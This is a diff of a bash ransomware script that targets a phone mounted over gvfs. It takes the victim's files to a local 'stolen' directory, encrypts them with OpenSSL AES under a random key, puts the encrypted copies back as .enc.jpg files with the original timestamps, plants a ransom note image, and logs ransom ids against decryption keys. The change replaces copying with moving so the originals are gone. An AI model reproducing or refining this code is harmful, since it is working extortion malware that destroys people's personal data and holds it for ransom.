@@ -25,7 +25,7 @@ timestamp=$(date)
 TRANSDIR="$DEVICEID $timestamp"
 mkdir "$TRANSDIR"
 
-#transfer and encrypt files. REMINDER: don't encrypt the note
+#transfer and encrypt each file
 enc_key=$(openssl rand 16 -hex)
 
 cd "$PHONEPATH"
@@ -38,22 +38,25 @@ do
 	
 	if [[ $f != "ransom"* ]] && [[ $f != *".enc.jpg" ]]; then #encrypt all files that are not already encrypted nor the ransom note file
 		echo "transferring and encrypting $f ($currentfile/$filecount)..."
-		gvfs-copy "$f" "$LOCALPATH/data/stolen/$TRANSDIR"
+		gvfs-move "$f" "$LOCALPATH/data/stolen/$TRANSDIR"
 		openssl aes-256-cbc -a -salt -in "$LOCALPATH/data/stolen/$TRANSDIR/$f" -out "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" -k $enc_key
-		touch -r "$f" "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" #give same timestamps to new encrypted file as old file, if supported
-		touch -r "$f" "$LOCALPATH/data/stolen/$TRANSDIR/$f" #same timestamp to copied file
-		gvfs-copy "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" .		
-		rm $f
-		rm "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg"
+		touch -r "$LOCALPATH/data/stolen/$TRANSDIR/$f" "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" #give same timestamps to new encrypted file as old file
+		gvfs-move "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" .	
+		
 		currentfile=$((currentfile+1))
 	fi
 
 done
+
+#re-copy note so it shows up first in gallery
 cd "$LOCALPATH"
 sleep 1
-gvfs-copy "media/ransomnote.png" "$PHONEPATH/ransom_$ransomid.png" #re-copy note so it shows up first in gallery
+gvfs-copy "media/ransomnote.png" "$PHONEPATH/ransom_$ransomid.png" 
 
-echo `date --rfc-3339=seconds` "|" $ransomid "|" $enc_key >> keys/keys.txt #store ransomid and encryption key pair
+#store ransomid and encryption key pair
+echo `date --rfc-3339=seconds` "|" $ransomid "|" $enc_key >> keys/keys.txt 
+
+#Finish up
 echo ""
 echo Encryption complete. check keys/keys.txt for ransom id and key
 echo Transferred photos stored in "data/stolen/$TRANSDIR"
